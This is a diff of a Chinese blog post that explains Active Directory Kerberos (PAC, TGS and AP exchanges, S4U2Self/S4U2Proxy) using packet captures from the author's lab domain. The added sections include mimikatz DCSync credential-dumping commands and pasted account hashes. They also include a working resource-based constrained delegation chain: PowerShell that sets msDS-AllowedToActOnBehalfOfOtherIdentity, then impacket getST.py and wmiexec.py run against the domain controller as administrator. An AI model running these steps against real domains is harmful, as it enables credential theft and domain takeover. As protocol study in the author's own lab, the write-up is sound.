@@ -168,7 +168,7 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-11-14 14:01:28
+          2025-11-23 15:05:11
         </span>
         
               <span class="post-tags">
@@ -316,6 +316,52 @@
 <p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251113192043916.png" alt="image-20251113192043916"></p>
 <h3 id="PAC">PAC</h3>
 <p>在分析<code>AS_REQ &amp; AS_REP</code>和<code>TGS_REQ &amp; TGS_REP</code>之前，我们先来看看什么是<code>PAC</code>？</p>
+<p><strong>PAC (Privilege Attribute Certificate，特权属性证书)</strong> 是微软在 Windows Active Directory (AD) 环境中对标准 Kerberos 协议的一个重要扩展。</p>
+<p>简单来说，如果把Kerberos票据（Ticket）比作一张“身份证”，那么PAC就是贴在身份证背面的”权限清单“和“防伪标签”。</p>
+<h4 id="为什么需要PAC？">为什么需要PAC？</h4>
+<p>标准的 Kerberos 协议主要解决的是 <strong>Authentication（认证）</strong> 问题，即证明“你是谁”。但在 Windows 环境中，服务（Service）还需要知道 <strong>Authorization（授权）</strong> 信息，即“你能干什么”。</p>
+<p>PAC 的引入就是为了解决这个问题：</p>
+<ul>
+<li>它包含用户的 <strong>SID (Security Identifier)</strong>、<strong>组 SID</strong>（如 Domain Admins）、用户配置文件路径等信息。</li>
+<li>有了 PAC，服务端在解密票据后，可以直接根据 PAC 里的组信息生成用户的<strong>访问令牌 (Access Token)</strong>，而不需要再次查询域控制器 (DC) 来获取用户的权限。</li>
+</ul>
+<h4 id="PAC位于哪里？">PAC位于哪里？</h4>
+<p>PAC 被放置在 Kerberos 票据（无论是 TGT 还是 ST）的 <strong>Authorization-Data</strong> 字段中。</p>
+<ul>
+<li>它随着票据一起被加密。只有拥有正确密钥（Krbtgt hash 或 服务账号 hash）的一方才能解密票据并读取 PAC。</li>
+</ul>
+<h4 id="PAC-包含哪些核心内容？">PAC 包含哪些核心内容？</h4>
+<p>PAC 是一个结构化的数据块（参考微软文档 <code>MS-PAC</code><sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>），主要包含以下几个关键部分：</p>
+<p>1、<strong>Logon Info (登录信息):</strong></p>
+<ul>
+<li>这是最核心的部分。包含用户的 SID 以及用户所属的所有组（Groups）的 SID。</li>
+<li>服务端就是靠这个列表来判断你是不是管理员。</li>
+</ul>
+<p>2、<strong>Client Name &amp; Logon Time:</strong> 用户名和登录时间。</p>
+<p>3、<strong>Checksums (签名/校验和):</strong></p>
+<p>这是防止 PAC 被篡改的关键。通常包含两个签名：</p>
+<ul>
+<li><strong>Server Signature:</strong> 使用目标服务账号的密钥（Server Key）进行签名。</li>
+<li><strong>KDC Signature:</strong> 使用 KDC 的密钥（Krbtgt Key）进行签名。</li>
+</ul>
+<p>这两个签名确保了 PAC 是由合法的 KDC 生成的，且在传输过程中未被篡改。</p>
+<h4 id="PAC的工作流程">PAC的工作流程</h4>
+<p>1、<strong>AS-REQ / AS-REP (认证阶段):</strong></p>
+<ul>
+<li>当用户登录时，KDC 在生成 <strong>TGT (Ticket Granting Ticket)</strong> 时，会查询 AD 数据库，获取用户的组信息，构建 PAC，并将其放入 TGT 中加密。此处的签名使用的是 <code>krbtgt</code> 的密钥。</li>
+</ul>
+<p>2、<strong>TGS-REQ / TGS-REP (申请服务票据阶段):</strong></p>
+<ul>
+<li>用户想访问某个服务（例如 SQL Server），向 KDC 提交 TGT。</li>
+<li>KDC 解密 TGT，验证 PAC 的签名。如果验证通过，KDC 会把 PAC 从 TGT 中复制出来，放入新的 <strong>ST (Service Ticket)</strong> 中。</li>
+<li><em>注意：此时 KDC 会用目标服务的密钥重新生成 PAC 中的 Server Signature。</em></li>
+</ul>
+<p>3、<strong>AP-REQ (访问服务阶段):</strong></p>
+<ul>
+<li>用户将 ST 发送给目标服务。</li>
+<li>服务使用自己的 NTLM Hash 解密 ST，提取出 PAC。</li>
+<li>服务根据 PAC 中的 SID 列表构建用户的访问令牌，从而决定是否允许用户执行操作。</li>
+</ul>
 <h3 id="AS-REQ-AS-REP">AS-REQ &amp; AS-REP</h3>
 <p>首先看一下<code>AS-REQ &amp; AS-REP</code>的部分。</p>
 <p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251113183452223.png" alt="image-20251113183452223"></p>
@@ -401,16 +447,187 @@
 <p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251113223327112.png" alt="image-20251113223327112"></p>
 <p>解密结果如下：主要包含认证时间authtime、认证到期时间endtime、域名srealm、请求的服务名sname、协商标志flags等信息。需要说明的是，在TGT中也包含<code>Logon Session Key</code>。</p>
 <h3 id="TGS-REQ-TGS-REP">TGS-REQ &amp; TGS-REP</h3>
+<p>下面就看一看抓取的<code>TGS-REQ &amp; TGS-REP</code>数据包。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114140823896.png" alt="image-20251114140823896"></p>
+<p>下面就是一个简要的<code>TGS-REQ &amp; TGS-REP</code>请求过程图，便于我们直接的了解请求的过程。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114160620239.png" alt="image-20251114160620239"></p>
+<p>下面具体分析<code>TGS-REQ &amp; TGS-REP</code>过程中的数据包细节。</p>
+<p>客户端在收到KDC的AS-REP后，使用用户密钥解密<code>enc_Logon Session Key</code>（也就是最外层的<code>enc-part</code>），得到<code>Logon Session Key</code>，并且也获得了<code>TGT</code>。之后，他会在本地缓存此<code>TGT</code>和<code>Lofon Session Key</code>。现在客户端需要凭借这张<code>TGT</code>向KDC购买相应的<code>ST</code>。<code>ST</code>是KDC的另一个服务<code>TGS(Ticket Granting Service)</code>授予服务发放的。在这个阶段，微软引入了两个扩展自协议<code>S4u2Self</code>和<code>S4u2Proxy</code>（委派时才用到，后面会介绍）。</p>
 <h4 id="1、TGS-REQ包分析">1、TGS-REQ包分析</h4>
+<p>客户端用上一步获得的TGT发起<code>TGS-REQ</code>，向<code>KDC</code>购买针对指定服务的<code>ST</code>，请求的内容如<code>TGS-REQ &amp; TGS-REP</code>图片中的A。下面就是wireshark抓取的<code>TGS-REQ</code>包的详细内容。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114162630566.png" alt="image-20251114162630566"></p>
+<p>后半部分：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114163114613.png" alt="image-20251114163114613"></p>
+<p>下面对部分字段内容进行详细的解释。</p>
+<ul>
+<li><strong>padata：</strong></li>
+</ul>
+<p><strong>包含ap-req，这个<code>TGS-REQ</code>必须携带的部分，这部分包含<code>AS-REP</code>中获取到的<code>TGT</code>票据和使用原始的<code>Logon Session Key</code>加密的时间戳</strong>。可能会有<code>PA_FOR_USER</code>，类型是<code>S4u2Self</code>，是唯一的标识符，指示用户的身份，由用户名和域名组成，<code>S4u2Proxy</code>必须扩展<code>PA_FOR_USER</code>结构，用于指定服务代表某个用户去请求针对服务自身的<code>Kerberos</code>服务票据。还可能会有<code>PA_PAC_OPTIONS</code>，类型是<code>PA_PAC_OPTIONS</code>。<code>S4u2Proxy</code>必须扩展<code>PA-PAC-OPTIONS</code>结构，<strong>如果是基于资源的约束性委派，就需要指定<code>Resource-based Constrained Delegation</code>位</strong>。</p>
+<ul>
+<li><strong>ap-req：</strong></li>
+</ul>
+<p>这个是TGS_REQ必须携带的部分。</p>
+<ul>
+<li><strong>ticket：</strong></li>
+</ul>
+<p>AS-REP回复包中返回的TGT</p>
+<ul>
+<li><strong>authenticator：</strong></li>
+</ul>
+<p>原始Logon Session Key加密的时间戳，用于保证会话安全。</p>
+<p>这里着重讲一下ap-req中的<code>authenticator</code>字段，该字段主要用于下一阶段的会话安全认证，为了保证下一阶段的会话安全，<strong><code>TGS-REQ</code>的<code>ap-req</code>中的<code>authenticator</code>字段的值使用的是上一步AS-REP中返回的Logon Session Key加密的时间戳</strong>，如下图：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114172041947.png" alt="image-20251114172041947"></p>
+<p>如下是<code>impacket/krb5/kerberosv5.py</code>脚本中的部分代码，从中可以看到使用了<code>Logon Session Key</code>加密的时间戳。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114222740139.png" alt="image-20251114222740139"></p>
 <h4 id="2、TGS-REP包分析">2、TGS-REP包分析</h4>
+<p>KDC的TGS服务接收到TGS_REQ之后会进行如下操作。首先，使用<code>krbtgt</code>秘钥解密TGT中的加密部分，得到<code>Logon Session Key</code>和<code>PAC</code>等信息，解密成功则说明该<code>TGT</code>是<code>KDC</code>颁发的；然后，验证<code>PAC</code>的签名，签名正确证明<code>PAC</code>未经过篡改；最后，使用<code>Logon Session Key</code>解密<code>authenticator</code>得到时间戳等信息，如果能解密成功，并且票据时间在有效的范围内，则验证了会话的安全性。</p>
+<p>在完成上述的检测后，KDC的TGS就完成了对客户端的认证，TGS发送回复包给客户端。该回复包中主要包括的信息。</p>
+<blockquote>
+<p>⚠️注意：TGS-REP中KDC并不会验证客户端是否有权限访问服务端。因此，不管用户有没有访问服务的权限，只要TGT正确，均会返回ST。</p>
+</blockquote>
+<p>TGS-REP包的详细内容如下：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114224103278.png" alt="image-20251114224103278"></p>
+<p>对TGS-REP包中部分字段进行解释，具体如下：</p>
+<ul>
+<li>**ticket：**即ST</li>
+<li><strong>enc-part（ticket中的）：这部分是用服务的密钥加密的（如果服务的Hash泄露了，就造成了白银票据传递攻击！⚠️⚠️⚠️）。</strong></li>
+<li><strong>enc-part（最外层的）：这部分是用原始的<code>Logon Session Key</code>加密的。里面最重要的字段是<code>Service Session Key</code>，作为下一阶段的认证密钥。</strong></li>
+</ul>
+<p>TGS-REP包中最重要的就是ST和Service Session Key。**ST中加密部分是使用服务密钥加密的。而Serveice Session Key是使用Logon Session Key加密的。**下面通过解密Wireshark来看看ST和Service Session Key中包含哪些内容。</p>
+<p><strong>（1）ST</strong></p>
+<p>TGS-REP包中的<code>ticket</code>便是<code>ST</code>，<code>ST</code>中包含明文显示的信息，如版本号tkt-vno、域名realm、请求的服务名sname，但最重要的还是加密部分。<strong>加密部分是使用服务秘钥加密的</strong>，主要包含Server Session Key、请求的用户名cname、域名crealm、认证时间authtime、认证到期时间endtime、authorization-data等信息。其中authorization-data部分包含客户端的身份权限等信息，这些信息包含在PAC中。</p>
+<p>首先是想办法去解密ticket中的enc-part，获取服务秘钥Hash，即这里就是域控中机器账户<code>BOB$</code>的Hash。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">token</span>::<span class="title">elevate</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">patch</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:TEST</span>.<span class="title">MYDOMAIN</span> /<span class="title">user:bob</span>$</span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+<p>如下图：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115112057504.png" alt="image-20251115112057504">利用服务秘钥Hash去生成keytab。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ktutil</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 CIFS 服务的 AES256 密钥</span></span><br><span class="line">add_entry -key -p cifs/bob.test.mydomain@TEST.MYDOMAIN -k 1 -e aes256-cts-hmac-sha1-96</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入aes256_hmac为：ba0616460f1c1fda7301f1ae4fd6dbd466413dcc561b51d7ecd3b4064fb2032d</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 AES128 密钥</span></span><br><span class="line">add_entry -key -p cifs/bob.test.mydomain@TEST.MYDOMAIN -k 1 -e aes128-cts-hmac-sha1-96</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入aes128_hamc为：4f6fc6975f472f5de32abc25c972357f</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 RC4 密钥</span></span><br><span class="line">add_entry -key -p cifs/bob.test.mydomain@TEST.MYDOMAIN -k 1 -e arcfour-hmac-md5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入bob$的NTLM Hash：b79fe04f4d3a245fa8bd46fa7c068e6a</span></span><br><span class="line"></span><br><span class="line">write_kt cifs_bob.keytab</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+<p>wireshark导入keytab，然后可以解密ticket的enc-part部分，获取相关的信息。</p>
+<p>如下图所示，就是解密后的ST：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115112811884.png" alt="image-20251115112811884"></p>
+<p>ST中<code>authorization-data</code>字段下代表用户身份权限的是PAC。下面我们只查看PAC的凭证信息部分<code>PAC_LOGON_INFO</code>。</p>
+<p>如下图，主要通过<code>User RID</code>和<code>Group RID</code>来辨别用户权限。通过对比发现，ST中的PAC和TGT中的PAC是一致的。在正常的非<code>S4u2Self</code>请求的TGS过程中，KDC在ST中的PAC直接复制了TGT中的PAC。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115115956555.png" alt="image-20251115115956555"></p>
+<p><strong>（2）Sevice Session Key</strong></p>
+<p>TGS-REP包最外层的部分便是Service Session Key，用于确保客户端和KDC下一阶段的通信安全，它使用Logon Session Key加密。</p>
+<p>如下图，对最外层的<code>enc-part</code>进行解密，它主要包含认证时间authtime、认证到期时间endtime、域名srealm、请求的服务名sname、协商标志flags等信息。需要说明的是ST中也包含<code>Sevice Session Key</code>。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251114230827624.png" alt="image-20251114230827624"></p>
 <h3 id="AP-REQ-AP-REP双向认证">AP-REQ &amp; AP-REP双向认证</h3>
+<p>客户端收到KDC返回的TGS-REP消息后，从中取出ST，准备开始申请访问服务。由于我们是通过SMB协议远程连接的，因此<code>AP-REQ &amp; AP-REP</code>消息是放在SMB协议中的，如下：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115142528780.png" alt="image-20251115142528780"></p>
+<blockquote>
+<p>注意⚠️：通过Impacket远程连接服务，默认不需要验证提供服务的服务端，因此这里没有AP-REP。</p>
+</blockquote>
+<p>下图是一个简要的<code>AP-REQ &amp; AP-REP</code>过程图，便于直观的了解请求过程。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115143824219.png" alt="image-20251115143824219"></p>
 <h4 id="1、AP-REQ包分析">1、AP-REQ包分析</h4>
+<p>客户端接受到KDC的TGS回复后，通过缓存的Logon Session Key解密enc_Service Session Key得到Service Session Key，同时它也拿到了ST。Service Session Key和ST会被客户端缓存。客户端访问指定服务时，将发起AP-REQ，该请求主要包含的信息，如下图：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251115151500548.png" alt="image-20251115151500548"></p>
+<p>下面对AP-REQ包中部分字段进行解释，具体如下：</p>
+<ul>
+<li><strong>ticket：票据。</strong></li>
+<li><strong>authenticator：Service Session Key加密的时间戳。</strong></li>
+</ul>
 <h4 id="2、AP-REP包分析">2、AP-REP包分析</h4>
+<p>这一步是可选的，当客户端希望验证提供服务的服务端时（也就是<strong>AP-REQ请求中<code>mutual-required</code>选项为<code>True</code></strong>），服务端返回AP-REP消息。服务端收到客户端发来的AP-REQ消息后，通过服务密钥解密ST得到Service Session Key和PAC等信息，然后用Service Session Key解密Authenticator得到时间戳，如果解密成功且时间戳在有效范围内，则验证了客户端的身份。验证了客户端身份后，服务端从ST中取出PAC中代表用户身份权限信息的数据，然后与请求的服务ACL做对比，生成相应的访问令牌。同时，<strong>服务端会检查AP-REQ请求中<code>mutual-required</code>选项是否为True，如果是，则说明客户端想验证服务端的身份</strong>。此时服务端会用Service Session Key加密时间戳作为Authenticator，在AP-REP包中发送给客户端进行验证。<strong>如果mutual-required选项为False，服务端会根据访问令牌的权限决定是否返回相应的服务给客户端</strong>。</p>
 <h3 id="S4u2Self-S4u2Proxy协议">S4u2Self &amp; S4u2Proxy协议</h3>
+<p>为了在Kerberos协议层面对约束性委派进行支持，微软对Kerberos协议扩展了两个自协议：<code>S4u2Self（Service for User to Self）</code>和<code>S4u2Proxy（Service for User to Proxy）</code>。</p>
+<p><code>S4u2Self</code>可以代表任意用户请求针对自身的服务票据；</p>
+<p><code>S4u2Proxy</code>可以用上一步获得的ST以用户的名义，请求针对其他指定服务的ST。</p>
+<p>对于基于资源的约束委派攻击，要满足以下的这些条件才能进行攻击：</p>
+<p>最低要求：</p>
+<p>✅ 域用户账户（任何认证用户）</p>
+<p>✅ 机器账户创建配额 &gt; 0（默认10）</p>
+<p>✅ 网络可达域控制器</p>
+<p>或者：</p>
+<p>✅ 对目标计算机有写权限</p>
+<p>✅ 可以设置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性。</p>
+<p>解释一下，对于最低要求的攻击场景，如下场景A（自己打自己，从普通域用户到本地管理员权限）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 场景A</span><br><span class="line">用户: john (普通域用户)</span><br><span class="line">权限: 默认域用户权限</span><br><span class="line">攻击: </span><br><span class="line">1. 创建机器账户 attackpc$</span><br><span class="line">2. 对自己工作站 WS-JOHN 配置RBCD</span><br><span class="line">3. 获取 WS-JOHN 的本地管理员权限</span><br></pre></td></tr></table></figure>
+<p>对于&quot;对目标计算机有写权限&quot;和&quot;可以设置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性&quot;。如下场景B（打别人，获取别人服务器的管理员权限，一般是进行横向移动使用的）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 场景B</span><br><span class="line">用户: alice (假设已获取该账户控制权，且该账户已被配置 SPN)</span><br><span class="line"></span><br><span class="line">权限: 对计算机对象 bob (CN=bob,OU=运维部,DC=test,DC=mydomain) 拥有 写权限 (GenericAll, GenericWrite, WriteDacl 或 WriteProperty -&gt; msDS-AllowedToActOnBehalfOfOtherIdentity)。</span><br><span class="line"></span><br><span class="line">攻击:</span><br><span class="line">1、配置信任关系 (Resource Constraint) 利用 alice 拥有的写权限，修改 bob 对象的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。将 alice 的 SID (S-1-5-21...-1109) 封装为安全描述符并在该属性中添加，从而“强行”让 bob 信任 alice 的委派请求。</span><br><span class="line"></span><br><span class="line">2、伪造身份 (S4U2Self) alice 使用自己的凭据向 KDC 发起 S4U2Self 请求，以 Administrator 的名义请求访问 alice 自身的服务票据 (ST)。</span><br><span class="line">		结果：获得了一张 Administrator -&gt; alice 的票据 (Evidence Ticket)。</span><br><span class="line"></span><br><span class="line">3、获取目标票据 (S4U2Proxy) alice 使用上一步获取的 Evidence Ticket，向 KDC 发起 S4U2Proxy 请求，申请访问 bob 的 CIFS 服务 (cifs/bob.test.mydomain) 的票据。</span><br><span class="line">		结果：由于步骤1配置了信任，KDC 返回了一张 Administrator -&gt; bob 的服务票据。</span><br><span class="line"></span><br><span class="line">获取 bob 的管理员权限 alice 将步骤3获取的票据导入内存 (Pass-The-Ticket)，直接访问 \\bob.test.mydomain\c$。此时 bob 认为访问者是域管理员 Administrator，从而允许执行任意文件操作或进一步利用 (如创建计划任务、上传木马等)。</span><br></pre></td></tr></table></figure>
+<p>下面演示的内容，就是场景A，主要目的是学习基于资源的约束委派，那就基于场景A去进行尝试。</p>
+<p>这个是在<strong>域控机器</strong>上进行尝试的，抓取基于资源的约束委派kerberos协议的流量，看一下和普通的kerberos流量有何不同。</p>
+<p>在域控中执行以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 删除已存在的机器账户（如果存在）</span></span><br><span class="line"><span class="built_in">Remove-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;attackpc&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 创建新的机器账户</span></span><br><span class="line"><span class="built_in">New-ADComputer</span> <span class="literal">-Name</span> <span class="string">&quot;attackpc&quot;</span> <span class="literal">-SamAccountName</span> <span class="string">&quot;attackpc<span class="variable">$</span>&quot;</span> <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;RootPass123!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Enabled</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 获取机器账户的SID</span></span><br><span class="line"><span class="variable">$ComputerSID</span> = (<span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;attackpc&quot;</span>).SID</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 配置基于资源的约束委派</span></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor(<span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="variable">$ComputerSID</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 转换安全描述符为字节数组</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 设置字节数组</span></span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 在域控上配置RBCD</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;DC&quot;</span> | <span class="built_in">Set-ADComputer</span> <span class="operator">-Replace</span> <span class="selector-tag">@</span>&#123;<span class="string">&quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;</span> = <span class="variable">$SDBytes</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 验证机器账户创建成功</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;attackpc&quot;</span> <span class="literal">-Properties</span> Enabled, DistinguishedName | <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 验证RBCD配置</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;DC&quot;</span> <span class="literal">-Properties</span> msDS<span class="literal">-AllowedToActOnBehalfOfOtherIdentity</span> | <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 检查域控的HOST服务SPN</span></span><br><span class="line">setspn <span class="literal">-L</span> DC | findstr <span class="string">&quot;HOST&quot;</span></span><br></pre></td></tr></table></figure>
+<p>在Kali中执行以下命令，进行基于资源的约束委派攻击（Resource-Based Constrained Delegation，RBCD）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">11. 执行约束委派攻击</span></span><br><span class="line">python3 getST.py -dc-ip DC.test.mydomain &#x27;test.mydomain/attackpc$:RootPass123!&#x27; -spn host/dc.test.mydomain -impersonate administrator</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">12. 设置票据环境变量</span></span><br><span class="line">export KRB5CCNAME=administrator@host_dc.test.mydomain@TEST.MYDOMAIN.ccache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">13. 验证票据</span></span><br><span class="line">klist</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">14. 使用票据获取域控访问权限</span></span><br><span class="line">python3 wmiexec.py -k -no-pass test.mydomain/administrator@DC.test.mydomain &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">15. 获取域管理员列表</span></span><br><span class="line">python3 wmiexec.py -k -no-pass test.mydomain/administrator@DC.test.mydomain &quot;net group \&quot;Domain Admins\&quot; /domain&quot;</span><br></pre></td></tr></table></figure>
+<p>生成票据成功。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251118121720428.png" alt="image-20251118121720428"></p>
+<p>成功执行命令。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251118121746690.png" alt="image-20251118121746690"></p>
+<p>下面就是使用wireshark进行抓包，分析这时的kerberos数据包的情况。</p>
 <h4 id="1、S4u2Self">1、S4u2Self</h4>
+<p>和正常的TGS-REQ包相比，S4u2Self协议的TGS-REQ包会多一个PA-DATA pA-FOR-USER，name为要模拟的用户，并且sname也是请求的服务自身。</p>
+<p>场景A请求的数据包，如下图：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251118125859937.png" alt="image-20251118125859937"></p>
 <h4 id="2、S4u2Proxy">2、S4u2Proxy</h4>
+<p>和正常的TGS-REQ包相比，S4u2Proxy协议的TGS-REQ包会增加一个additional-tickets字段，该字段的内容就是上一步利用S4u2Self请求的ST。</p>
+<p>首先是建立场景B的环境。</p>
+<p>第一步我们先查看域控上有哪些账户，使用命令<code>Get-ADUser -Filter *</code>，结果如下：</p>
